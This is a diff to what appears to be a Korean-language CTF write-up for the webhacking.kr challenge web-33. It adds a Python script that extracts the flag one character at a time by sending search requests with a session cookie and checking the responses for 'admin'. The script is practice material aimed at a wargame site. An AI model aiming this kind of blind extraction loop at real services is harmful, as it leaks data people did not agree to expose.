@@ -49,3 +49,22 @@ FLAG 값을 파이썬을 이용하여 구하였다. 코드는 제공하기 싫�
 <img width="401" alt="스크린샷 2020-01-08 오전 1 24 46" src="https://user-images.githubusercontent.com/54495632/71910784-e8a21780-31b5-11ea-9648-9a6287dceb69.png">
 
 
+import requests
+
+cookies={'PHPSESSID':'ㄴㅓ의 쿠키 값'}
+url="https://webhacking.kr/challenge/web-33/index.php"
+flag="flag{"
+data={'search':""}
+
+for i in range(0,100):
+    for j in range(38,127):
+
+        data['search']=flag+chr(j)
+
+        res=requests.post(url,cookies=cookies,data=data)
+        if((res.text).find("admin")>0):
+            flag+=chr(j)
+            print ("flag :"+flag)
+            break
+
+print ("finish flag :"+flag)
